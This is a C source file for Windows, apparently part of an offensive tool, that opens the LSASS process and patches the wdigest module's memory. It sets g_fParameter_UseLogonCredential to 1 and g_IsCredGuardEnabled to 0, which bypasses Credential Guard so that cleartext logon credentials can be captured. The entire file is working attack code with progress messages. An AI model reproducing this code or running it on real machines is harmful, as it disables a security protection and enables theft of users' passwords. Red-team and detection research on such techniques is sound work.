#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <tlhelp32.h>
#include <Tchar.h>

#include "WdigestOffsets.h"

DWORD WINAPI disableCredGuardByPatchingLSASS(void) {
    HANDLE hProcessSnap;
    HANDLE hLsass;
    PROCESSENTRY32 pe32;
    // Set the size of the structure before using it.
    pe32.dwSize = sizeof(PROCESSENTRY32);
    pe32.th32ProcessID = 0;

    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        _tprintf(TEXT("[!] Cred Guard bypass failed: impossible to get snapshot of the system's processes (CreateToolhelp32Snapshot)\n"));
        return 1;
    }

    // Retrieve information about the first process,
    // and exit if unsuccessful
    if (!Process32First(hProcessSnap, &pe32)) {
        _tprintf(TEXT("[!] Cred Guard bypass failed: obtained invalid process handle\n")); // show cause of failure
        CloseHandle(hProcessSnap);          // clean the snapshot object
        return 1;
    }

    // Now walk the snapshot of processes, and look for "lsass.exe"
    do {
        if (_tcscmp(pe32.szExeFile, TEXT("lsass.exe")) == 0) {
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));
    CloseHandle(hProcessSnap);

    if (_tcscmp(pe32.szExeFile, TEXT("lsass.exe")) != 0 || pe32.th32ProcessID == 0) {
        _tprintf(TEXT("[!] Cred Guard bypass failed: coudln't find LSASS process\n"));
        return 1;
    }

    // Open an handle to the LSASS process.
    hLsass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
    if (hLsass == NULL || hLsass == INVALID_HANDLE_VALUE) {
        _tprintf(TEXT("[!] Cred Guard bypass failed: couldn't open lsass memory (OpenProcess, error code 0x%lx)\n"), GetLastError());
        return 1;
    }

    HMODULE hModulesArray[512] = { 0 };
    DWORD lpcbNeeded;
    if (!EnumProcessModules(hLsass, hModulesArray, sizeof(hModulesArray), &lpcbNeeded)) {
        _tprintf(TEXT("[!] Cred Guard bypass failed: couldn't enumerate lsass loaded modules (EnumProcessModules, error code 0x%lx)\n"), GetLastError());
        CloseHandle(hLsass);
        return 1;
    }

    BOOL returnStatus = FALSE;
    TCHAR szModulename[MAX_PATH];
    for (DWORD i = 0; i < (lpcbNeeded / sizeof(HMODULE)); i++) {
        if (hModulesArray[i] && !GetModuleFileNameEx(hLsass, hModulesArray[i], szModulename, _countof(szModulename))) {
            _tprintf(TEXT("[!] Cred Guard bypass non fatal error: couldn't get module name for module at index 0x%lx (GetModuleFileNameEx, error code 0x%lx)\n"), i, GetLastError());
            continue;
        }

        if (_tcsstr(szModulename, TEXT("wdigest"))) {
            MODULEINFO moduleInfo = { 0 };
            if (hModulesArray[i] && !GetModuleInformation(hLsass, hModulesArray[i], &moduleInfo, sizeof(MODULEINFO))) {
                _tprintf(TEXT("[!] Cred Guard bypass non fatal error: couldn't get module information for module at index 0x%lx (GetModuleInformation, error code 0x%lx)\n"), i, GetLastError());
                continue;
            }

            // Computes the exact address in memory of g_fParameter_UseLogonCredential & g_IsCredGuardEnabled using load lib wdigest base address + known offsets.
            DWORD64 wdigestBaseAddress = (DWORD64)moduleInfo.lpBaseOfDll;

            DWORD currentValue = 0x0;
            DWORD CurrentValueLength = sizeof(DWORD);
            SIZE_T bytesRead = 0;
            SIZE_T bytesWritten = 0;

            /*
            * Setting g_fParameter_UseLogonCredential to 0x1.
            * First attempt to read the current value and, if the read was successfull patch the g_fParameter_UseLogonCredential to bypass Cred Guard.
            */
            DWORD64 useLogonCredentialAddress = wdigestBaseAddress + wdigestOffsets.st.g_fParameter_UseLogonCredential;
            DWORD useLogonCredentialPatch = 0x1;
            _tprintf(TEXT("[*] Attempting to patch wdigest's g_fParameter_UseLogonCredential at 0x%I64x\n"), useLogonCredentialAddress);
            //if (ReadProcessMemory(hLsass, addrOfUseLogonCredentialGlobalVariable, &dwCurrent, dwCurrentLength, &bytesRead))
            if (ReadProcessMemory(hLsass, (PVOID)useLogonCredentialAddress, &currentValue, CurrentValueLength, &bytesRead)) {
                _tprintf(TEXT("[+] Found wdigest's g_fParameter_UseLogonCredential with a current value of 0x%lx\n"), currentValue);
            }
            else {
                _tprintf(TEXT("[!] Cred Guard bypass fatal error: couldn't retrieve wdigest's g_fParameter_UseLogonCredential value (ReadProcessMemory, error code 0x%lx). An overwrite will not be attempted.\n"), GetLastError());
                break;
            }
            if (currentValue != useLogonCredentialPatch) {
                if (WriteProcessMemory(hLsass, (PVOID)useLogonCredentialAddress, (PVOID)&useLogonCredentialPatch, sizeof(DWORD), &bytesWritten)) {
                    ReadProcessMemory(hLsass, (PVOID)useLogonCredentialAddress, &currentValue, CurrentValueLength, &bytesRead);
                    if (currentValue == useLogonCredentialPatch) {
                        _tprintf(TEXT("[+] Successfully overwrote wdigest's g_fParameter_UseLogonCredential value to 0x%lx\n"), currentValue);
                    }
                    else {
                        _tprintf(TEXT("[!] Cred Guard bypass fatal error: unsuccessful overwrite of wdigest's g_fParameter_UseLogonCredential value (current value 0x%lx instead of 0x%lx)\n"), currentValue, useLogonCredentialPatch);
                    }
                }
                else {
                    _tprintf(TEXT("[!] Cred Guard bypass fatal error: an error occurred will attempting to overwrite wdigest's g_fParameter_UseLogonCredential value (WriteProcessMemory, error code 0x%lx)\n"), GetLastError());
                    break;
                }
            }
            else {
                _tprintf(TEXT("[+] wdigest's g_fParameter_UseLogonCredential is already patched!\n"));
            }
            _tprintf(TEXT("\n\n"));

            /*
            * Setting g_IsCredGuardEnabled to 0x0.
            * Needs to temporary set the memory page of g_IsCredGuardEnabled to PAGE_READWRITE to conduct the patch.
            * First attempt to read the current value and, if the read was successfull patch the g_fParameter_UseLogonCredential to bypass Cred Guard.
            */
            DWORD64 credGuardEnabledAddress = wdigestBaseAddress + wdigestOffsets.st.g_IsCredGuardEnabled;
            DWORD isCredGuardEnabledPatch = 0x0;
            currentValue = 0x0;
            bytesRead = 0;
            bytesWritten = 0;
            DWORD oldMemoryProtection = 0x0;
            _tprintf(TEXT("[*] Attempting to patch wdigest's g_fParameter_UseLogonCredential at 0x%I64x\n"), credGuardEnabledAddress);
            _tprintf(TEXT("[*] Attempting to set wdigest's g_IsCredGuardEnabled memory protection as PAGE_READWRITE\n"));
            if (!VirtualProtectEx(hLsass, (PVOID)credGuardEnabledAddress, sizeof(DWORD), PAGE_READWRITE, &oldMemoryProtection)) {
                _tprintf(TEXT("[!] Cred Guard bypass fatal error: Failed to set wdigest's g_IsCredGuardEnabled memory protection to PAGE_READWRITE (VirtualProtectEx, error code 0x%lx)\n"), GetLastError());
                break;
            }
            if (ReadProcessMemory(hLsass, (PVOID)credGuardEnabledAddress, &currentValue, CurrentValueLength, &bytesRead)) {
                _tprintf(TEXT("[+] Found wdigest's g_IsCredGuardEnabled with a current value of 0x%lx\n"), currentValue);
            }
            else {
                _tprintf(TEXT("[!] Cred Guard bypass fatal error: couldn't retrieve wdigest's g_IsCredGuardEnabled value (ReadProcessMemory, error code 0x%lx). An overwrite will not be attempted.\n"), GetLastError());
                break;
            }
            if (currentValue != isCredGuardEnabledPatch) {
                if (WriteProcessMemory(hLsass, (PVOID)credGuardEnabledAddress, (PVOID)&isCredGuardEnabledPatch, sizeof(DWORD), &bytesWritten)) {
                    ReadProcessMemory(hLsass, (PVOID)credGuardEnabledAddress, &currentValue, CurrentValueLength, &bytesRead);
                    if (currentValue == isCredGuardEnabledPatch) {
                        _tprintf(TEXT("[+] Successfully overwrote wdigest's g_IsCredGuardEnabled value to 0x%lx\n"), currentValue);
                    }
                    else {
                        _tprintf(TEXT("[!] Cred Guard bypass fatal error: unsuccessful overwrite of wdigest's g_IsCredGuardEnabled value (current value 0x%lx instead of 0x%lx)\n"), currentValue, isCredGuardEnabledPatch);
                    }
                }
                else {
                    _tprintf(TEXT("[!] Cred Guard bypass fatal error: an error occurred will attempting to overwrite wdigest's g_IsCredGuardEnabled value (WriteProcessMemory, error code 0x%lx)\n"), GetLastError());
                    break;
                }
            }
            else {
                _tprintf(TEXT("[+] wdigest's g_IsCredGuardEnabled is already patched!\n"));
            }
            DWORD newMemoryProtection = 0x0;
            if (!VirtualProtectEx(hLsass, (PVOID)credGuardEnabledAddress, sizeof(DWORD), oldMemoryProtection, &newMemoryProtection)) {
                _tprintf(TEXT("[!] Cred Guard bypass non fatal error: Failed to restore wdigest's g_IsCredGuardEnabled memory protection to its original value (VirtualProtectEx, error code 0x%lx)\n"), GetLastError());
            }
            else {
                _tprintf(TEXT("[+] Successfully restored wdigest's g_IsCredGuardEnabled memory protection to its original value\n"));
            }
            _tprintf(TEXT("\n\n"));

            returnStatus = TRUE;

        }
    }
    CloseHandle(hLsass);

    return returnStatus;
}
